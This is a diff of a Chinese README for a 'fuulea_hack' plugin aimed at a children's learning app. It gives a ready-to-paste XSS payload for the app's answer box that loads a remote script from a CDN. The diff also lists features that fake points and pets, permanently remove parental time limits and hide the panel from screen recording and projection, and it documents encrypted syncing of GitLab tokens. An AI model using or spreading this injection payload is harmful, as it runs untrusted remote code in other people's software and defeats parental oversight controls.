@@ -7,10 +7,12 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.2.1/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.3/loader.js'">
 ```
 
-150 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
+154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
+
+> 注入串必须带 `https:` 协议。v3.2.1 及更早的 README 示例是不带协议的 `//fastly...`，页面本身用 `file://` 打开时，浏览器会把 `//fastly.jsdelivr.net/...` 解析成 `file://fastly.jsdelivr.net/...`，于是报 `net::ERR_FILE_NOT_FOUND`，插件根本不加载。
 
 之后每次只要 44 字符：
 
@@ -25,6 +27,19 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.3
+
+- 修注入串：`mods/test.js` 与 README 改回绝对地址 `https://fastly.jsdelivr.net/...`（原来把 `https:` 剥成 `//`，在 `file://` 页面里会变成 `file://fastly...`，新设备直接加载失败）。
+- 新增 ☁ 配置上传 / 下载（工具页）：把本机所有 `fh:*` 配置（API Key 除外，密码/会话/缓存/模型源码除外）加密成一个文件，提交到公开仓库 `config/<id>.json`；换设备或清缓存后输入 PIN 即可找回。配置按用户隔离，同一仓库可以存多份。
+  - 首次「⬆ 上传配置」：填 GitLab Token + 设置 PIN（6-30 位）+ 可选管理员密钥；之后「⬇ 更新配置」只需要 PIN，Token 会被加密保存在配置里、自动取用。
+  - 每个配置文件用随机 256 位会话密钥加密（AES-GCM），会话密钥分别用 PIN、Token、管理员密钥包裹（PBKDF2-SHA256 15 万次）。PIN 本身不落盘，仓库里只有包裹后的信封。
+  - **忘记 PIN**：配置弹窗里有「忘记 PIN」，用上传时的 Token 或管理员密钥解包并重置 PIN（配置内容与 ID 不变，只换 PIN 信封）。仓库管理员也可用 `recover.html` 或 GitLab CI 的 `reset-pin` 手动任务重置。
+  - 清缓存后首次打开插件，若云端已有配置，会弹一条可点击的提示「☁ 云端有 N 份配置，点此输入 PIN 恢复」。
+- 主面板重排：学习（改名 / 积分 / 灵宠 / 宠物图 / 加宠物 / 解锁4只）、工具（网页 / 相机 / 文件 / 小说 / 音乐 / 图片 / 转印 / 存档 / 遮罩 / 名单 / 清答案 / 上传配置 / 更新配置 / 解除限时 / 清空）、chat（AI 网页）、白板（占位按钮，功能开发中）、便签。
+- AI 网页（chat）：拍照改为网页相机（`getUserMedia`，不走系统相机），支持前后摄像头切换；不可用时才降级为文件选择。附件栏在设置过 GitLab Token 后多一个「上传至 GitLab 仓库」勾选项。
+- 相机 / 文件（`mods/media.js`）：设置过 GitLab Token 时，查看媒体窗口顶栏出现 ⬆，可把当前图片/视频直接上传到仓库 `media/`。
+- 网页（`mods/embed.js`）：每个网页窗口顶栏最左新增「←」，关闭当前窗口并回到上一个打开的网页；没有上一个时按钮置灰。
 
 ## v3.2.1
 
@@ -58,7 +73,9 @@
 
 | 按钮 | 文件 | 作用 |
 |---|---|---|
-| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、拍照/相册、多会话、Chat/Responses、模型扫描、共享聊天室、探测缓存 |
+| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照/相册、多会话、Chat/Responses、模型扫描、共享聊天室、探测缓存 |
+| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到 `config/<id>.json`（除 API Key / 会话 / 缓存） |
+| ⬇ 更新配置 | `loader.js` | 输入 PIN 从云端解密取回配置，换设备/清缓存后一键恢复 |
 | ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
 | 💰 积分 | `mods/score.js` | 设 `score` + `earned`（两个一起改才生效） |
 | 🐾 灵宠 | `mods/pets.js` | 数量（≤4）、种类（fox/qilin/cat/dog）、名字 |
@@ -66,10 +83,33 @@
 | ✏️ 改名 | `mods/rename.js` | 清玩家名 / 灵宠名 / 排行榜里的旧记录 |
 | 🧹 清答案 | `mods/clean.js` | 删错题本里存的答题原文 `yourAns` |
 | 🖼 图片 | `mods/img.js` | 直链图片全屏弹窗 |
-| 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗（受对方 X-Frame-Options 限制） |
+| 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗；顶栏「←」回到上一个网页（受对方 X-Frame-Options 限制） |
+| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像 / 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/` |
 | 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
 | 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |
 | ⏱ 解除限时 | `loader.js` | 一键永久解除上课时段 / 周末 / 20 分钟配额 |
+| 🖌 白板 | `loader.js` | 占位按钮（v3.3 仅提示「开发中」） |
+
+## 配置同步（v3.3）
+
+`config/<id>.json` 结构（公开仓库，加密后才提交）：
+
+```js
+{
+  v: 1, at, tag, id,                            // 版本 / 时间 / 插件版本 / 配置 ID（u+10 位 base36）
+  kdf: { salt, iter: 150000 },                  // PBKDF2-SHA256
+  hint,                                         // 昵称（明文，方便认领）
+  wrapPin,                                      // AES-GCM(DK, KDF('pin|'+id+'|'+PIN))     ← 日常解锁
+  wrapTok,                                      // AES-GCM(DK, KDF('tok|'+id+'|'+TOKEN))   ← 忘记 PIN 用
+  wrapAdm,                                      // AES-GCM(DK, KDF('adm|'+id+'|'+管理员密钥)) ← 管理员重置用
+  box: { tok, keys }                            // AES-GCM(DK, {上传用 Token, 全部配置键值})
+}
+```
+
+- `DK` 是每份配置随机的 256 位密钥；PIN / Token / 管理员密钥只用来包裹 `DK`，都不落盘。
+- 配置 ID 与 PIN 无关：重置 PIN 不改文件名，旧 PIN 立即失效。
+- `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身。
+- 恢复流程：`pullConfig` → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）。
 
 ## 存档结构
 
@@ -84,7 +124,7 @@
 }
 ```
 
-`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）。
+`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态。
 
 ## 注意
 
